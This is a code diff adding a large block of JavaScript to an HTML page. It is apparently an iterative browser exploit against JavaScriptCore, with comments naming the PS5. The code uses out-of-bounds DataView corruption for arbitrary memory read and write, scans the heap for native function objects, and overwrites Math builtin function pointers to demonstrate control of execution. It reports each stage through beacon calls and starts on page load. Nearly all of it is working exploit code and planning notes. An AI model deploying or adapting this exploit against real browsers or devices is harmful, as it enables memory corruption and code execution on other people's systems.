+                                verd('ok','V49 OOB R/W 0x'+oobSize.toString(16)+' + destructors repaired');
+
+                                /* ==== V56: NE CENSUS + NAMED SWAP ==== */
+/* V55 proved: CagedPtr is identity (full process ARW via m_vector rewrite).
+ * Module text is execute-only (read-fatal). Module rodata is readable.
+ * NativeExecutable layout (source-verified):
+ *   +0x00 JSCell, +0x08..+0x20 ExecutableBase (4 JITCode fields),
+ *   +0x28 m_function (raw fp), +0x30 m_constructor (raw fp),
+ *   +0x38 implVis, +0x40 m_name (StringImpl*), +0x48 m_asString.
+ * Census: scan cage heap for NE-shaped objects, read their names,
+ * then swap two Math.* builtins' m_function pointers. */
+try{
+  bs('V61-START');
+  bs('V61-BASE='+hex(BASE));
+  var vEnd56=ri_mData+BigInt(oobSize);
+  var fcOff56=Number(freshCell-ri_mData);
+  var origVec56=oobDV.getBigUint64(fcOff56+0x10,true);
+  var origLen56=oobDV.getBigUint64(fcOff56+0x18,true);
+  bs('V61-CELL='+hex(freshCell)+'-origVec='+hex(origVec56));
+
+  function absRead56(addr,len){
+    oobDV.setBigUint64(fcOff56+0x10,addr,true);
+    oobDV.setBigUint64(fcOff56+0x18,BigInt(len),true);
+    var out=[];
+    for(var ri=0;ri<len;ri+=8){out.push(freshDV.getBigUint64(ri,true));}
+    oobDV.setBigUint64(fcOff56+0x10,origVec56,true);
+    oobDV.setBigUint64(fcOff56+0x18,origLen56,true);
+    return out;
+  }
+  function absWrite56(addr,val){
+    oobDV.setBigUint64(fcOff56+0x10,addr,true);
+    oobDV.setBigUint64(fcOff56+0x18,8n,true);
+    freshDV.setBigUint64(0,val,true);
+    oobDV.setBigUint64(fcOff56+0x10,origVec56,true);
+    oobDV.setBigUint64(fcOff56+0x18,origLen56,true);
+  }
+  var strDbg58=0;
+  function readStr56(strImpl){   /* V58: correct StringImpl layout */
+    /* V61: bounded gate. Cage: only the known-mapped observed heap [lowB,
+     * view_end). Module: only RODATA (RVA>=0x7000000; text is read-fatal). */
+    var ve61=ri_mData+BigInt(oobSize);
+    var loHeap61=(typeof lowB!=='undefined'&&lowB>0x1000000000n)?lowB:ri_mData;
+    if(!(strImpl>=loHeap61&&strImpl<ve61)&&!(strImpl>=BASE+0x7000000n&&strImpl<BASE+0x20000000n))return'<OOR:'+hex(strImpl)+'>';
+    try{
+      oobDV.setBigUint64(fcOff56+0x10,strImpl,true);
+      oobDV.setBigUint64(fcOff56+0x18,0x60n,true);
+      var h0=freshDV.getBigUint64(0x00,true);
+      var len=Number((h0>>32n)&0xFFFFFFFFn);
+      var fl=freshDV.getUint32(0x08,true);
+      var s='';
+      if(len>=1&&len<=48){for(var si=0;si<len&&si<32;si++)s+=String.fromCharCode(freshDV.getUint8(0x0C+si));}
+      oobDV.setBigUint64(fcOff56+0x10,origVec56,true);
+      oobDV.setBigUint64(fcOff56+0x18,origLen56,true);
+      if(strDbg58<3){bs('V61-STRDBG-impl='+hex(strImpl)+'-h0='+hex(h0)+'-len='+len+'-f=0x'+fl.toString(16)+'-s='+s);strDbg58++;}
+      if(len<1||len>48)return'<len='+len+'-f=0x'+fl.toString(16)+'>';
+      return s;
+    }catch(e){
+      try{oobDV.setBigUint64(fcOff56+0x10,origVec56,true);oobDV.setBigUint64(fcOff56+0x18,origLen56,true);}catch(e2){}
+      return'<err>';
+    }
+  }
+
+  /* ---- STAGE 1 (V59): NativeExecutable census - REGION ORDER FIXED ----
+   * V58 lessons: (1) all 40 region-A finds were false positives (the probe's
+   * own beacon-URL string allocations - repeated fn/ctor pairs, ASCII hdrs,
+   * 0xffffffff poison). (2) Region B never ran: its trigger required stAddr <
+   * ri_mData, but the ST sat INSIDE the view this session. The real NEs live
+   * BELOW the view (V57 found them at 0x10004c0xxx with DISTINCT fps).
+   * FIX: region B now anchors on the RECLAIMED FACE (self - the lowest
+   * reliable known-mapped address), runs FIRST, and every candidate gets
+   * false-positive rejection (fn dedup, ASCII/poison hdr rejection). */
+  bs('V61-CENSUS-START');
+  var modLo=BASE-0x1000000n, modHi=BASE+0x10000000n;
+  var neCands56=[];
+  var fnCount56={};
+  function fpReject56(hv,fv){
+    if(hv===0||hv===0xffffffff)return true;
+    var ascii=true,poison=false;
+    for(var hb=0;hb<4;hb++){var b8=(hv>>>(hb*8))&0xFF;if(b8<0x20||b8>0x7e){ascii=false;break;}}
+    if(ascii)return true;
+    return false;
+  }
+  function pushCand56(cellAddr,hdr56,q28,q30,namePtr){
+    var fk=String(q28);
+    if(fnCount56[fk]===undefined)fnCount56[fk]=0;
+    fnCount56[fk]++;
+    if(fnCount56[fk]>3)return false;   /* reject repeated-fn families (vtable/URL strings) */
+    neCands56.push({addr:cellAddr,fn:q28,ctor:q30,hdr:hdr56,name:null,namePtr:namePtr});
+    return true;
+  }
+
+  /* ---- REGION B (FIRST): [lowB, ri_mData) - the real NE region below the view.
+   * lowB = min(self, stAddr) - both known-mapped; self = the reclaimed face,
+   * the lowest reliable anchor of the session. */
+  var stAddr58=0n;
+  try{
+    if(typeof freshMBuf!=='undefined'&&freshMBuf>ri_mData&&freshMBuf+0x20n<(ri_mData+BigInt(oobSize))){
+      stAddr58=oobDV.getBigUint64(Number(freshMBuf-ri_mData)+0x18,true);
+    }else if(typeof realAB!=='undefined'&&realAB>ri_mData&&realAB+0x20n<(ri_mData+BigInt(oobSize))){
+      stAddr58=oobDV.getBigUint64(Number(realAB-ri_mData)+0x18,true);
+    }
+  }catch(e56b){}
+  var lowB=0n;
+  if(typeof self!=='undefined'&&self>0x1000000000n)lowB=self;
+  if(stAddr58>0x1000000000n&&(lowB===0n||stAddr58<lowB))lowB=stAddr58;
+  bs('V61-LOWB='+hex(lowB)+'-stAddr='+hex(stAddr58)+'-viewBase='+hex(ri_mData));
+  if(lowB>=0x1000000000n&&lowB<ri_mData){
+    var lowLen=Number(ri_mData-lowB);
+    bs('V61-BSCAN-range='+hex(lowB)+'..'+hex(ri_mData)+'-len='+lowLen);
+    oobDV.setBigUint64(fcOff56+0x10,lowB,true);
+    oobDV.setBigUint64(fcOff56+0x18,BigInt(lowLen),true);
+    var totB=0;
+    for(var ci2=0x28;ci2<lowLen-0x50;ci2+=8){
+      var b28;
+      try{b28=freshDV.getBigUint64(ci2,true);}catch(e){break;}
+      if(b28<=modLo||b28>=modHi)continue;
+      totB++;
+      var b30;
+      try{b30=freshDV.getBigUint64(ci2+8,true);}catch(e){break;}
+      if(b30<=modLo||b30>=modHi)continue;
+      var cellOffB=ci2-0x28;
+      if(cellOffB<0)continue;
+      var hdrB;
+      try{hdrB=freshDV.getUint32(cellOffB,true);}catch(e){break;}
+      if(fpReject56(hdrB,b28))continue;
+      var npB;
+      try{npB=freshDV.getBigUint64(cellOffB+0x40,true);}catch(e){break;}
+      pushCand56(lowB+BigInt(cellOffB),hdrB,b28,b30,npB);
+      if(neCands56.length>=200)break;
+    }
+    oobDV.setBigUint64(fcOff56+0x10,origVec56,true);
+    oobDV.setBigUint64(fcOff56+0x18,origLen56,true);
+    bs('V61-BSCAN-TOTAL-MOD='+totB+'-NE='+neCands56.length);
+    /* name-decode pass (freshDV free again) */
+  }else bs('V61-BSCAN-SKIP');
+
+  /* ---- REGION A (SECOND): first 4MB of the view, same rejection ---- */
+  var scanEnd=Math.min(oobSize, 0x400000);
+  var totalMod=0;
+  for(var ci=0x28;ci<scanEnd&&neCands56.length<300;ci+=8){
+    var q28;
+    try{q28=oobDV.getBigUint64(ci,true);}catch(e){continue;}
+    if(q28<=modLo||q28>=modHi)continue;
+    totalMod++;
+    var q30;
+    try{q30=oobDV.getBigUint64(ci+8,true);}catch(e){continue;}
+    if(q30<=modLo||q30>=modHi)continue;
+    var cellOff=ci-0x28;
+    if(cellOff<0)continue;
+    var hdr56;
+    try{hdr56=oobDV.getUint32(cellOff,true);}catch(e){continue;}
+    if(fpReject56(hdr56,q28))continue;
+    var namePtr;
+    try{namePtr=oobDV.getBigUint64(cellOff+0x40,true);}catch(e){continue;}
+    pushCand56(ri_mData+BigInt(cellOff),hdr56,q28,q30,namePtr);
+  }
+  bs('V61-ASCAN-TOTAL-MOD='+totalMod+'-NE-total='+neCands56.length);
+
+  /* V60: decode names for ALL candidates (both regions) - the V59 bug was
+   * decoding only inside region B; region A's real NEs stayed name=null. */
+  for(var nb=0;nb<neCands56.length;nb++){
+    if(neCands56[nb].name===null||neCands56[nb].name===undefined){
+      try{neCands56[nb].name=readStr56(neCands56[nb].namePtr);}catch(eDec){neCands56[nb].name='<err>';}
+    }
+  }
+
+  bs('V61-CENSUS-NE-FOUND='+neCands56.length);
+  for(var ni=0;ni<neCands56.length;ni++){
+    var ne=neCands56[ni];
+    var fnRva=ne.fn-BASE,ctorRva=ne.ctor-BASE;
+    bs('V61-NE-'+ni+'=@'+hex(ne.addr)+'-fn='+hex(fnRva)+'-ctor='+hex(ctorRva)+'-hdr=0x'+ne.hdr.toString(16)+'-name='+ne.name);
+  }
+
+  /* ---- STAGE 2: Find two named Math.* builtins for the swap ---- */
+  var swapA=null,swapB=null;
+  var TARGET_A='sqrt',TARGET_B='abs';
+  for(var si2=0;si2<neCands56.length;si2++){
+    if(neCands56[si2].name===TARGET_A&&!swapA)swapA=neCands56[si2];
+    if(neCands56[si2].name===TARGET_B&&!swapB)swapB=neCands56[si2];
+  }
+  if(!swapA||!swapB){
+    for(var si3=0;si3<neCands56.length;si3++){
+      if(neCands56[si3].name==='floor'&&!swapA)swapA=neCands56[si3];
+      if(neCands56[si3].name==='ceil'&&!swapB)swapB=neCands56[si3];
+    }
+  }
+  if(!swapA||!swapB){
+    bs('V61-SWAP-SKIP-no-pair-found');
+    bs('V61-NAMES=['+neCands56.map(function(x){return x.name;}).join(',')+']');
+  }else{
+    bs('V61-SWAP-A='+swapA.name+'@'+hex(swapA.addr)+'-fn='+hex(swapA.fn));
+    bs('V61-SWAP-B='+swapB.name+'@'+hex(swapB.addr)+'-fn='+hex(swapB.fn));
+
+    /* pre-swap baselines — use inputs that distinguish the two functions */
+    var testVal=-5.7;
+    var preA,preB;
+    try{
+      if(swapA.name==='sqrt'){preA=Math.sqrt(testVal);}
+      else if(swapA.name==='abs'){preA=Math.abs(testVal);}
+      else if(swapA.name==='floor'){preA=Math.floor(testVal);}
+      else if(swapA.name==='ceil'){preA=Math.ceil(testVal);}
+    }catch(e){preA='err';}
+    try{
+      if(swapB.name==='abs'){preB=Math.abs(testVal);}
+      else if(swapB.name==='sqrt'){preB=Math.sqrt(testVal);}
+      else if(swapB.name==='floor'){preB=Math.floor(testVal);}
+      else if(swapB.name==='ceil'){preB=Math.ceil(testVal);}
+    }catch(e){preB='err';}
+    bs('V61-PRE-A='+swapA.name+'('+testVal+')='+preA);
+    bs('V61-PRE-B='+swapB.name+'('+testVal+')='+preB);
+
+    /* ---- STAGE 3: THE SWAP — write B's m_function over A's ---- */
+    var aFnAddr=swapA.addr+0x28n;
+    var origAFn=swapA.fn;
+    bs('V61-WRITING-fn-at='+hex(aFnAddr)+'-old='+hex(origAFn)+'-new='+hex(swapB.fn));
+    absWrite56(aFnAddr,swapB.fn);
+
+    /* verify the write */
+    var readBack=absRead56(aFnAddr,8);
+    bs('V61-READBACK='+hex(readBack[0])+'-expected='+hex(swapB.fn)+'-match='+(readBack[0]===swapB.fn));
+
+    /* post-swap test */
+    var postA;
+    try{
+      if(swapA.name==='sqrt'){postA=Math.sqrt(testVal);}
+      else if(swapA.name==='abs'){postA=Math.abs(testVal);}
+      else if(swapA.name==='floor'){postA=Math.floor(testVal);}
+      else if(swapA.name==='ceil'){postA=Math.ceil(testVal);}
+    }catch(e){postA='err:'+String(e&&e.message?e.message:'?');}
+    bs('V61-POST-A='+swapA.name+'('+testVal+')='+postA+'-was='+preA);
+
+    var changed=(String(postA)!==String(preA));
+    bs('V61-BEHAVIORAL-CHANGE='+changed);
+
+    if(changed){
+      bs('V61-PC-REDIRECTION-CONFIRMED');
+    }
+
+    /* ---- STAGE 4: RESTORE original m_function ---- */
+    absWrite56(aFnAddr,origAFn);
+    var restored=absRead56(aFnAddr,8);
+    bs('V61-RESTORED='+hex(restored[0])+'-match='+(restored[0]===origAFn));
+
+    /* verify restoration */
+    var postRestore;
+    try{
+      if(swapA.name==='sqrt'){postRestore=Math.sqrt(testVal);}
+      else if(swapA.name==='abs'){postRestore=Math.abs(testVal);}
+      else if(swapA.name==='floor'){postRestore=Math.floor(testVal);}
+      else if(swapA.name==='ceil'){postRestore=Math.ceil(testVal);}
+    }catch(e){postRestore='err';}
+    bs('V61-POST-RESTORE='+swapA.name+'('+testVal+')='+postRestore+'-original='+preA);
+  }
+
+  /* ---- STAGE 5: Drift dump (lightweight) ---- */
+  try{
+    if(typeof realAB!=='undefined'&&realAB>ri_mData&&realAB+0x60n<vEnd56){
+      var so56=Number(realAB-ri_mData);var sd='';
+      for(var di=0;di<0x60;di+=8)sd+=hex(oobDV.getBigUint64(so56+di,true))+'|';
+      bs('V61-DRIFT-STALE='+hex(realAB)+'='+sd);
+    }
+    if(typeof freshMBuf!=='undefined'&&freshMBuf>ri_mData&&freshMBuf+0x60n<vEnd56){
+      var lo56=Number(freshMBuf-ri_mData);var ld='';
+      for(var di2=0;di2<0x60;di2+=8)ld+=hex(oobDV.getBigUint64(lo56+di2,true))+'|';
+      bs('V61-DRIFT-LIVE='+hex(freshMBuf)+'='+ld);
+    }
+  }catch(eD){bs('V61-DRIFT-ERR');}
+
+  bs('V61-DONE');
+  verd('ok','V56 NE census + swap');
+}catch(e56){bs('V61-ERR-'+String(e56&&e56.message?e56.message:'?'));}
+/* ==== V56 END ==== */
+
+                              }
+                            }else{
+                              bs('V48-GATE-FAIL-on-real-impl');
+                            }
+                          }else{
+                            /* H2: Same object — binary divergence */
+                            bs('V48-H2-SAME-OBJECT-binary-divergence');
+                            bs('V48-TRYING-LADDER-ANYWAY');
+                            /* Try the ladder even with the "stale" expansion */
+                            var ladder2=[0x101, 0x200, 0x100];
+                            for(var li2=0;li2<ladder2.length;li2++){
+                              try{
+                                var dv2 = new DataView(sprayBuf, 0, ladder2[li2]);
+                                bs('V48-H2-LADDER-OK-0x'+ladder2[li2].toString(16));
+                                break;
+                              }catch(el2){
+                                bs('V48-H2-LADDER-FAIL-0x'+ladder2[li2].toString(16));
+                              }
+                            }
+                          }
+                        }
+                        if(false){ /* OLD V46/V47 diagnostics — dead code */
+                        void(0); /* CORE DIAGNOSTIC: dump the FULL JSArrayBuffer cell.
+                         * jsABCell was found at V45 step. Read 0x80 bytes. */
+                        if(typeof jsABCell !== 'undefined' && jsABCell > 0n){
+                          bs('V46-JSAB-CELL='+hex(jsABCell));
+
+                          /* Read 0x80 bytes of the JSArrayBuffer cell */
+                          var cellDump=readAt(jsABCell, 0x80);
+                          bs('V46-JSAB-FULL='+cellDump);
+
+                          /* Dump as qwords for analysis */
+                          for(var qi=0;qi<16;qi++){
+                            var qv=v45LE64(cellDump, qi*8);
+                            bs('V46-JSAB-q'+qi+'=@'+qi*8+'='+hex(qv));
+                          }
+
+                          /* Search for 0x100 (256) anywhere in the cell */
+                          var found256=[];
+                          for(var si=0;si<0x78;si++){
+                            var dw=v45LE32(cellDump,si);
+                            if(dw===0x100)found256.push(si);
+                          }
+                          bs('V46-FOUND-256-AT=['+found256.map(function(x){return '0x'+x.toString(16)}).join(',')+']');
+
+                          /* Search for the realAB pointer in the cell */
+                          var foundAB=[];
+                          for(var ai=0;ai<0x78;ai+=8){
+                            var pv=v45LE64(cellDump,ai);
+                            if(pv===useAB)foundAB.push(ai);
+                          }
+                          bs('V46-FOUND-REAL-AB-AT=['+foundAB.map(function(x){return '0x'+x.toString(16)}).join(',')+']');
+
+                          /* Also check: does the cell contain a DIFFERENT AB pointer? */
+                          /* Search for any pointer in the 0x1000xxxxxxx range */
+                          var ptrs=[];
+                          for(var pi=0;pi<0x78;pi+=8){
+                            var pp=v45LE64(cellDump,pi);
+                            if(pp>0x1000000000n&&pp<0x2000000000n)ptrs.push(pi+':'+hex(pp));
+                          }
+                          bs('V46-CELL-PTRS=['+ptrs.join(',')+']');
+                        }
+
+                        /* Also dump the JSArrayBuffer's Structure to understand field layout.
+                         * The structureID is in the first 4 bytes of the cell header. */
+                        if(typeof jsABCell !== 'undefined' && jsABCell > 0n){
+                          var structID=v45LE32(cellDump,0);
+                          bs('V46-STRUCT-ID=0x'+structID.toString(16));
+                          var cellType=parseInt(cellDump.substr(5*2,2),16);
+                          bs('V46-CELL-TYPE=0x'+cellType.toString(16));
+                        }
+
+                        /* Try: read the m_impl from different offsets to find it */
+                        if(typeof jsABCell !== 'undefined' && jsABCell > 0n){
+                          for(var oi=0x10;oi<=0x40;oi+=8){
+                            var candidate=v45LE64(cellDump,oi);
+                            if(candidate>0x1000000000n&&candidate<0x2000000000n){
+                              /* Read 8 bytes at candidate+0x10 to see if it looks like m_data */
+                              var cData=v45LE64(readAt(candidate+0x10n,8),0);
+                              var isMatch=(cData===real_mData);
+                              bs('V46-IMPL-PROBE-@0x'+oi.toString(16)+'='+hex(candidate)+'-mData='+hex(cData)+'-match='+isMatch);
+                              if(isMatch){
+                                /* Found! Read its m_sizeInBytes */
+                                var cSize=v45LE64(readAt(candidate+0x30n,8),0);
+                                bs('V46-IMPL-SIZE='+hex(cSize)+'-at-cell+0x'+oi.toString(16));
+                              }
+                            }
+                          }
+                        }
+
+                        bs('V48-MIDX='+mIdx);
+                        bs('V48-STALE-A='+hex(useAB));
+
+                        /* V48: FRESH DV → REAL IMPL → EXPAND → OOB */
+                        /* DEAD: old V47 analysis */
+                        /* Cell layout (from V46):
+                         *   +0x00: JSCell header
+                         *   +0x08: butterfly (0)
+                         *   +0x10: m_impl (ArrayBuffer*)
+                         *   +0x18: inline slot 0 (0)
+                         *   +0x20: inline slot 1 (0)
+                         *   +0x28: 0x0000000100000000 (contains 256 value)
+                         *   +0x30: 0x0000000800000007
+                         *
+                         * The dword at cell+0x2C = 0x00000001.
+                         * q5 at cell+0x28 = 0x0000000100000000.
+                         * q6 at cell+0x30 = 0x0000000800000007.
+                         *
+                         * These look like JSValue-encoded properties. In JSC on PS5:
+                         * - The byteLength might be stored as cell+0x2C (uint32=1??)
+                         *   or the whole q5 might be a NaN-boxed value.
+                         *
+                         * STRATEGY: Fire COOP write at cell+0x0C (aim).
+                         * This puts:
+                         *   cell+0x14 (+0x08): 0xF in low 4B (m_impl high bytes — BAD)
+                         *   cell+0x1C (+0x10): 8B zero (inline slot 0 area — safe, already 0)
+                         *   cell+0x24 (+0x18): 0x00 byte (safe, already 0)
+                         *   cell+0x2C (+0x20): 0x01 byte → already 0x01, no change!
+                         *
+                         * That doesn't help. The +0x20 byte lands at cell+0x2C which
+                         * is already 0x01.
+                         *
+                         * ALTERNATIVE: Aim at cell+0x10.
+                         *   cell+0x18 (+0x08): 0xF → inline slot 0 (was 0 → becomes 0xF)
+                         *   cell+0x20 (+0x10): 8B zero → inline slot 1 (already 0)
+                         *   cell+0x28 (+0x18): 0x00 byte → first byte of q5 (already 0)
+                         *   cell+0x30 (+0x20): 0x01 byte → first byte of q6 (was 0x07!)
+                         *     q6 was 0x0000000800000007. Byte 0 = 0x07. → becomes 0x01.
+                         *     q6 becomes 0x0000000800000001.
+                         *
+                         * Does modifying q6 affect byteLength? Unknown.
+                         * isFulfilled: reads cell+0x30 (= q6 byte 0 = 0x07) → nonzero → FAILS!
+                         *
+                         * ALTERNATIVE: Aim at cell+0x08.
+                         *   cell+0x10 (+0x08): 0xF → m_impl low 4B! CORRUPTS POINTER!
+                         *   BAD.
+                         *
+                         * The problem: almost every aim corrupts something critical.
+                         * The isFulfilled gate blocks most aims because the cell has
+                         * non-zero data at aim+0x20.
+                         *
+                         * WORKING AIMS (where cell[aim-cell+0x20] == 0):
+                         *   Need byte at aim+0x20 == 0 in the cell.
+                         *   Cell bytes that are 0: offsets 0x08-0x0F, 0x18-0x1F, 0x20-0x27,
+                         *   0x28-0x2B, 0x2D-0x2F, 0x38-0x7F.
+                         *
+                         *   aim+0x20 = cell+X where cell[X]=0:
+                         *   aim = cell + X - 0x20.
+                         *
+                         *   X=0x08: aim = cell-0x18. Writes hit BEFORE the cell (other object).
+                         *   X=0x18: aim = cell-0x08. +0x08 = cell+0x00 (header!) BAD.
+                         *   X=0x20: aim = cell+0x00. +0x08 = cell+0x08 (butterfly) → 0xF.
+                         *           +0x10 = cell+0x10 (m_impl) → ZEROED! BAD.
+                         *   X=0x28: aim = cell+0x08. +0x08 = cell+0x10 (m_impl) → 0xF! BAD.
+                         *   X=0x38: aim = cell+0x18. +0x08 = cell+0x20 → 0xF (was 0 → 0xF)
+                         *           +0x10 = cell+0x28 → zero (q5 → 0). CLEARS the cached size!
+                         *           +0x18 = cell+0x30 → 0x00 byte
+                         *           +0x20 = cell+0x38 → 0x01 byte
+                         *
+                         *   aim = cell+0x18 might work: isFulfilled reads cell+0x38 = 0 ✓
+                         *   But it ZEROES cell+0x28 (q5) — erases the cached size to 0!
+                         *   After: byteLength might be 0. WORSE than 256.
+                         *
+                         * CONCLUSION: The COOP write can only write 0 or 0xF or 0x01.
+                         * We can't write an arbitrary larger size into the cached field.
+                         * We need a different approach.
+                         *
+                         * NEW IDEA: Instead of modifying the CACHED property, what if
+                         * we modify the STRUCTURE so the getter reads from m_impl instead
+                         * of from the cached property? Or: delete the cached property
+                         * so the getter falls through to a slow path that reads m_impl?
+                         *
+                         * OR: Zero the cache (aim cell+0x18: zeros q5), then the getter
+                         * might see 0 and fall through to m_impl. Let's TEST this!
+                         *
+                         * OR: The cached value might not be byteLength at all — it might
+                         * be the Structure's inline capacity marker. Let's do a NON-DESTRUCTIVE
+                         * test first: read byteLength, allocate ANOTHER buffer of size 512,
+                         * find ITS cell, check if q5/q6 differ.
+                         */
+
+                        bs('V47-CONTROL-TEST');
+
+                        /* Create a CONTROL buffer with different size to compare cell layout */
+                        var ctrlBuf = new ArrayBuffer(512);
+                        bs('V47-CTRL-BYTELEN='+ctrlBuf.byteLength);
+
+                        /* We need the control buffer's JSArrayBuffer cell.
+                         * Strategy: put ctrlBuf somewhere findable, read the heap.
+                         * Simpler: store it in a property we can find. */
+
+                        /* Use the spray mechanism: our spray has DataViews that
+                         * give us readAt. We can search for the ctrl buffer's
+                         * backing store in the heap. But finding JS objects from
+                         * readAt requires GC heap scanning.
+                         *
+                         * SIMPLER: Create a DataView on ctrlBuf, find its cell
+                         * via the same CELLC mechanism. But that's complex.
+                         *
+                         * SIMPLEST: Just try a third ArrayBuffer of a very different
+                         * size and compare the V46 fields. Make a 1024-byte buffer
+                         * and a 64-byte buffer. Read their byteLength. Then
+                         * if we zero q5 on OUR buffer and byteLength changes,
+                         * we know q5 holds the cached size. */
+
+                        /* Actually, let's just check: is q5 a JSValue encoding of 256?
+                         * In JSC 64-bit NaN-boxing:
+                         *   Integer 256 = 0xfffe000000000100
+                         *   But q5 = 0x0000000100000000 — doesn't match!
+                         *
+                         * What about the PS5's encoding? Maybe it uses a different
+                         * tagging scheme. 0x0000000100000000 could be:
+                         *   - A boxed integer with tag=0 and value=0x100000000 (4GB?) No.
+                         *   - Two uint32s: {0, 1} — maybe {padding, isTransferable}?
+                         *
+                         * q6 = 0x0000000800000007. Two uint32s: {7, 8}.
+                         * 7 and 8 could be slot indices or flags.
+                         *
+                         * Maybe these aren't the byte length at all! The FOUND-256-AT
+                         * search was unaligned (0x2B) — it's a coincidence that
+                         * bytes 0x2B-0x2E read as 256 when they're actually the
+                         * boundary between two unrelated uint32 fields (0 and 1).
+                         *
+                         * V47 DIAGNOSTIC: Rather than guessing, let's observe
+                         * what the getter ACTUALLY does by:
+                         * 1. Reading byteLength before any corruption
+                         * 2. Zeroing q5 (cell+0x28) via COOP and reading byteLength again
+                         * 3. If byteLength changes → q5 holds the cached value
+                         * 4. If byteLength stays 256 → it's read from m_impl
+                         *    (but we already expanded m_impl, so it would show 72PB)
+                         *    OR it's read from somewhere else entirely
+                         *
+                         * WAIT — if byteLength comes from m_impl and m_impl is expanded,
+                         * JS should already show 72PB. But it shows 256. So EITHER:
+                         * a) There's a MAX clamp in the getter
+                         * b) The getter uses a different field/structure
+                         * c) The getter returns a cached/compiled value from JIT
+                         *
+                         * For (c): force deoptimization by doing something unusual
+                         * with the buffer before reading byteLength.
+                         */
+
+                        /* Test: does Object.getOwnPropertyDescriptor reveal the getter? */
+                        try{
+                          var desc=Object.getOwnPropertyDescriptor(ArrayBuffer.prototype,'byteLength');
+                          bs('V47-GETTER-TYPE='+(desc?desc.get?'accessor':'data':'none'));
+                        }catch(eg){bs('V47-GETTER-ERR');}
+
+                        /* Test: read byteLength in a loop to see if it's consistent */
+                        var bl1=sprayBuf.byteLength;
+                        var bl2=sprayBuf.byteLength;
+                        bs('V47-BL-CONSISTENT='+(bl1===bl2)+'-val='+bl1);
+
+                        /* Test: try reading .byteLength via Reflect */
+                        try{
+                          var rbl=Reflect.get(sprayBuf,'byteLength');
+                          bs('V47-REFLECT-BL='+rbl);
+                        }catch(er){bs('V47-REFLECT-ERR');}
+
+                        /* Test: call the getter explicitly */
+                        try{
+                          var getter=Object.getOwnPropertyDescriptor(ArrayBuffer.prototype,'byteLength').get;
+                          var gbl=getter.call(sprayBuf);
+                          bs('V47-GETTER-CALL='+gbl);
+                        }catch(eg2){bs('V47-GETTER-CALL-ERR-'+String(eg2&&eg2.message?eg2.message:'?'));}
+
+                        /* Test: read m_impl directly and call byteLength on it
+                         * via our oracle to see what native sees */
+                        var nativeSize=v45LE64(readAt(useAB+0x30n,8),0);
+                        bs('V47-NATIVE-SIZE='+hex(nativeSize));
+
+                        /* Test: what does the old (pre-expansion) certified DV report
+                         * for its own buffer's byteLength? */
+                        try{
+                          var dvs=window.__v688&&window.__v688.dvs;
+                          if(dvs&&dvs[mIdx]){
+                            var dvBuf=dvs[mIdx].buffer;
+                            bs('V47-DV-BUF-SAME='+(dvBuf===sprayBuf));
+                            bs('V47-DV-BUF-BL='+dvBuf.byteLength);
+                          }
+                        }catch(edb){bs('V47-DV-BUF-ERR');}
+                        } /* end if(false) dead V46/V47 code */
+
+                      }catch(edv){bs('V48-ERR-'+String(edv&&edv.message?edv.message:'?'));}
+                    }else if(f45){
+                      bs('V45-SIZE-NOT-EXPANDED='+hex(newSize));
+                    }else{bs('V45-FIRE-FAIL');}
+                  }
+                }
+              }catch(e45){bs('V45-ERR-'+String(e45&&e45.message?e45.message:'?'));}
+              /* ==== V45 END ==== */
+
+              bs('PATHB-DONE-with-V45');
+              verd('ok','V45 '+hex(cell));
+              return;
+            }
+            bs('ADDROF-FAIL-all-candidates-rejected-n='+cellCandsL.length);
+          }
+
+          bs('PATHB-DONE-read-only-identity-probe');
+          bs('PATHB-NOTE-not-a-valid-COOP-arbitrary-write-yet; ResolveCallback semantics + deterministic JSC addrof linkage still needed; p812/p813 source-only');
+          verd('ok','Path B identity probe done (read-only)');
+        },70);
+        /* ==== V688 STEP 9 END ==== */
+
+
+
+
+      },60); /* post ADD-OK */
+    },40); /* post FAMILY-OK */
+  },60); /* post FORGED */
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')
+  setTimeout(function(){if(!/reset=1|soft=1/.test(location.search))setTimeout(start,DL);},0);
+else document.addEventListener('DOMContentLoaded',function(){if(!/reset=1|soft=1/.test(location.search))setTimeout(start,DL);});
+</script></body></html>
